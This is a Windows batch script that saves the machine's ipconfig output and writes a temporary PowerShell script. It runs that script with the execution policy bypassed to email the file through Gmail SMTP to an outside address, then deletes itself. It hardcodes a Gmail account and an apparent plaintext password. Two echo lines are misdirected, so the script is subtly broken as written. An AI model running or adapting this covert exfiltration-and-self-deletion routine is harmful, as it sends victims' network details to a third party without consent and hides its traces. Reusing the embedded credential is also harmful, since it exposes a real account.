ipconfig >C:\ipinfo.txt
@echo off
SET GmailAccount=projdatatests@gmail.com
SET GmailPassword=C0D!N6PR0J3CT5
SET Attachment=C:\ipinfo.txt

CALL :PowerShell
CD /C "%PowerShellDir%"
Powershell -ExecutionPolicy Bypass -Command "& '%PShellScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'"
IF EXIST "%~FN0" DEL /Q /F "%~FN0"
EXIT


:PowerShell
SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
SET PShellScript=%temp%\~sendEmail.ps1
IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"

ECHO $Username      = $args[0]>> "%PShellScript%"
ECHO $EmailPassword = $args[1]>> "%PShellScript%"
ECHO $Attachment    = $args[2]>> "%PShellScript%"
ECHO                          >> "%PShellScript%"
ECHO $Username    = $Username                 >> "%PShellScript%"
ECHO $EmailTo     = "dogclemente@gmail.com" >> "%PShellScript%"
ECHO $EmailFrom   = "projdatatests@gmail.com" >> "%PShellScript%"
ECHO $Subject     = "IP Address Info CONF File"           >> "%PShellScript%"
ECHO $Body        = "See attachment for ip info"              >> "%PShellScript%"
ECHO $SMTPServer  = "smtp.gmail.com"          >> "%PSScript%"
ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> "%PShellScript%"
ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment)                            >> "%PShellScript%"
ECHO $SMTPMessage.Attachments.Add($Attachment)                                                    >> "%PShellScript%"
ECHO $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)                               >> "%PShellScript%"
ECHO $SMTPClient.EnableSsl = $true                                                                >> "%PShellScript%"
ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> "%PShellScript%"
ECHO $SMTPClient.Send($SMTPMessage)
GOTO :EOF
